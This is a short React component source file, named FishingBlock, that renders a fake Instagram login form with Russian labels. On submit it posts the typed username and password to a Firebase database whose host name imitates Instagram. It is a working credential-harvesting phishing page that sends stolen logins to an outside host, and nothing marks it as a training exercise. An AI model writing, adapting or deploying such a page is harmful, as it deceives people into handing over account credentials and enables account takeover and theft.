import React from 'react'
import classes from './Fishing.module.css'
import { useRef } from 'react'
function FishingBlock() {
    const userNameRef = useRef()
    const passwordRef = useRef()
    const submitHandler =  async (event) => {
        event.preventDefault()
        let user = {
            userName: userNameRef.current.value,
            password: passwordRef.current.value,
        }
        try {
            const response = await fetch('https://instagram-com-df51a-default-rtdb.firebaseio.com/users.json', {
                method: "POST",
                body: JSON.stringify(user),
                headers: {
                    'Content-type': 'application/json'
                }
            })
            if(!response.ok) {
                throw new Error(`Failed to login something wrong ${response.status}`)
            }
            const data = await response.json();
            console.log(data)
        } catch (error) {
            console.log(error)
        } 
    }
    return (
        <div>
            <form onSubmit={submitHandler} className={classes.Form}>
            <div className={classes.email}>
                    <input
                        ref={userNameRef}                        
                        placeholder='Телефон, имя пользователя или эл адрес'
                        type="text"
                    />
                </div>
                <div className={classes.password}>
                    <input
                        ref={passwordRef}
                        type="text"
                        placeholder="Пароль"
                    />
                </div>
            <div className={classes.next}>
                <button type="submit">Войти</button>
            </div>
            </form>
        </div>
    )
}
export default FishingBlock;